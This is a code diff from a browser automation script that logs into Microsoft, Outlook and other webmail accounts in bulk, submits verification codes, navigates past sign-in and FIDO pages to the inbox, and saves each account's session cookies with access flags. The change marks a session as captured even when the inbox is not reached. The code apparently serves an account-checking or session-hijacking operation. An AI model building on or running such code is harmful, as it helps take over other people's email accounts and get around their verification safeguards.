@@ -6403,52 +6403,81 @@ if (!foundSelector) {
                                 updateBrowserRowDataFast(browserId, updateData);
                                 break;
                             } else {
+                                // The verification challenge was passed (not code error, not returned to choice screen).
+                                // Handle post-verification views (KMSI / "Stay signed in?", OAuth consent dialogs, etc.)
+                                await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+
+                                // If page is stuck on auth/redirect/FIDO URLs, navigate directly to inbox
+                                const postCodeUrl = page.url();
+                                if (
+                                    postCodeUrl.includes('login.microsoftonline.com') ||
+                                    postCodeUrl.includes('login.live.com') ||
+                                    postCodeUrl.includes('login.microsoft.com') ||
+                                    postCodeUrl.includes('account.live.com') ||
+                                    postCodeUrl.includes('account.microsoft.com') ||
+                                    postCodeUrl.includes('oauth20_authorize') ||
+                                    postCodeUrl.includes('fido/')
+                                ) {
+                                    const emailDomain = email ? String(email.split('@')[1] || '').toLowerCase().replace(/[^a-z0-9.]/g, '') : '';
+                                    let directInboxUrl = null;
+                                    if (platform === 'outlook' || platformConfig.url?.includes('live.com') || platformConfig.url?.includes('office.com')) {
+                                        directInboxUrl = await platformConfigs._getSmartInboxUrl(page, browserId, email);
+                                    } else {
+                                        directInboxUrl = PLATFORM_INBOX_URLS[emailDomain] || platformConfig.url;
+                                    }
+                                    if (directInboxUrl) {
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Page still on auth/redirect after code (${postCodeUrl}). Navigating directly to inbox: ${directInboxUrl}`);
+                                        await page.goto(directInboxUrl, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(e =>
+                                            logger.warn(`[processRow][${browserId}][WAITINGCODE] Direct navigation to inbox failed: ${e.message}`)
+                                        );
+                                        await new Promise(resolve => setTimeout(resolve, 3000));
+                                        await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                    }
+                                }
+
                                 let inboxCheckAfterCode = false;
                                 for (let attempt = 0; attempt < 3; attempt++) {
                                     inboxCheckAfterCode = await isInbox(page, platformConfig).catch(() => false);
                                     if (inboxCheckAfterCode) break;
                                     logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox not reached yet after code (attempt ${attempt + 1}/3). Waiting 5s for redirect...`);
                                     await new Promise(resolve => setTimeout(resolve, 5000));
-                                }
-                                if (inboxCheckAfterCode) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.`);
-                                    finalStatus = "PROCESSING_FINALIZING";
-                                    codeSuccessfullyProcessed = true;
-                                    initialCheckResult.reachedInbox = true;
-                                    initialCheckResult.requiresVerification = false;
-                                    initialCheckResult.accountAccess = true;
-                                    initialCheckResult.verificationState = null;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
-                                    const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                    updateData.status = "PROCESSING_FINALIZING";
-                                    updateData.cookieJSON = JSON.stringify(browserCookies);
-                                    updateData.verified = true;
-                                    updateData.fullAccess = true;
-                                    updateData.cookieAccess = true;
-                                    updateData.lastJsonResponse = JSON.stringify({
-                                        browserId, email, status: "PROCESSING_FINALIZING",
-                                        emailExists: true, accountAccess: true,
-                                        reachedInbox: true, requiresVerification: false,
-                                        verified: true, fullAccess: true,
-                                        platform, timestamp: new Date().toISOString(),
-                                        message: "Successfully verified and reached inbox."
-                                    });
-
-                                    // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
-                                    updateBrowserRowDataFast(browserId, {
-                                        status: "PROCESSING_FINALIZING",
-                                        cookieJSON: updateData.cookieJSON,
-                                        cookieAccess: true,
-                                        verified: true,
-                                        fullAccess: true,
-                                        lastJsonResponse: updateData.lastJsonResponse
-                                    });
-
-                                    break;
                                 }
-                                logger.error(`[processRow][${browserId}][WAITING_CODE] Unexpected page state after verification attempt. Failing. Current URL: ${page.url()}`);
-                                finalStatus = "FAILED";
-                                codeSuccessfullyProcessed = false;
+
+                                const isInboxFinal = inboxCheckAfterCode;
+                                logger.info(`[processRow][${browserId}][WAITINGCODE] Verification passed (reachedInbox=${isInboxFinal}). Finalizing session as PROCESSING_FINALIZING.`);
+                                finalStatus = "PROCESSING_FINALIZING";
+                                codeSuccessfullyProcessed = true;
+                                initialCheckResult.reachedInbox = isInboxFinal;
+                                initialCheckResult.requiresVerification = false;
+                                initialCheckResult.accountAccess = true;
+                                initialCheckResult.verificationState = null;
+
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                updateData.status = "PROCESSING_FINALIZING";
+                                updateData.cookieJSON = JSON.stringify(browserCookies);
+                                updateData.verified = true;
+                                updateData.fullAccess = isInboxFinal;
+                                updateData.cookieAccess = true;
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    browserId, email, status: "PROCESSING_FINALIZING",
+                                    emailExists: true, accountAccess: true,
+                                    reachedInbox: isInboxFinal, requiresVerification: false,
+                                    verified: true, fullAccess: isInboxFinal,
+                                    platform, timestamp: new Date().toISOString(),
+                                    message: isInboxFinal ? "Successfully verified and reached inbox." : "Successfully verified credentials."
+                                });
+
+                                // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                updateBrowserRowDataFast(browserId, {
+                                    status: "PROCESSING_FINALIZING",
+                                    cookieJSON: updateData.cookieJSON,
+                                    cookieAccess: true,
+                                    verified: true,
+                                    fullAccess: isInboxFinal,
+                                    lastJsonResponse: updateData.lastJsonResponse
+                                });
+
                                 break;
                             }
                     } else {
